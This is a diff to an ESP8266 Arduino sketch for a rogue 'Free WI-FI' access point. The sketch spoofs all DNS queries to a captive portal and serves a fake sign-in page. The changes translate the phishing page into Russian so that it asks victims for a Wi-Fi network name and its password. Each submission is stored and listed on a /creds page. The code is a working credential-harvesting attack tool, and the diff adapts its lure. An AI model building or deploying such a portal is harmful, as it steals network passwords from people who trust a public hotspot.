@@ -7,12 +7,12 @@
 #include <ESP8266WebServer.h>
 
 // User configuration
-#define SSID_NAME "Free WiFi2"
-#define SUBTITLE "Free WiFi service."
-#define TITLE "Sign in:"
-#define BODY "Create an account to get connected to the internet."
-#define POST_TITLE "Validating..."
-#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
+#define SSID_NAME "Free WI-FI"
+#define SUBTITLE "Авторизация точки доступа в сети интернет."
+#define TITLE "Подключение:"
+#define BODY "Введите название точки доступа и её пароль."
+#define POST_TITLE "Авторизация..."
+#define POST_BODY "Ваша точка доступа WI-FI авторизирована. Подождите пожалуйста 5 минут для завершения валидации.</br>Спасибо Вам."
 #define PASS_TITLE "Credentials"
 #define CLEAR_TITLE "Cleared"
 
@@ -32,7 +32,7 @@ String input(String argName) {
   a.substring(0,200); return a; }
 
 String footer() { return 
-  "</div><div class=q><a>&#169; All rights reserved.</a></div>";
+  "</div><div class=q><a>&#169; Иваново. Все права защищены.</a></div>";
 }
 
 String header(String t) {
@@ -59,14 +59,14 @@ String creds() {
 
 String index() {
   return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
-    "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
-    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
+    "<b>WI-FI:</b> <center><input type=text autocomplete=email name=email></input></center>" +
+    "<b>Пароль:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
 }
 
 String posted() {
   String email=input("email");
   String password=input("password");
-  Credentials="<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
+  Credentials="<li>WI-FI: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
   return header(POST_TITLE) + POST_BODY + footer();
 }
 
@@ -94,15 +94,32 @@ void setup() {
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(SSID_NAME);
   dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
-  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
-  webServer.on("/creds",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
-  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
-  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
+webServer.on("/post",[]() { 
+    webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
+    webServer.send(HTTP_CODE, "text/html", posted()); 
+    BLINK(); 
+  });
+
+  webServer.on("/creds",[]() { 
+    webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
+    webServer.send(HTTP_CODE, "text/html", creds()); 
+  });
+
+  webServer.on("/clear",[]() { 
+    webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
+    webServer.send(HTTP_CODE, "text/html", clear()); 
+  });
+
+  webServer.onNotFound([]() { 
+    lastActivity=millis(); 
+    webServer.sendHeader("Content-Type", "text/html; charset=UTF-8");
+    webServer.send(HTTP_CODE, "text/html", index()); 
+  });
+
   webServer.begin();
   pinMode(BUILTIN_LED, OUTPUT);
   digitalWrite(BUILTIN_LED, HIGH);
 }
-
 
 void loop() { 
   if ((millis()-lastTick)>TICK_TIMER) {lastTick=millis();} 
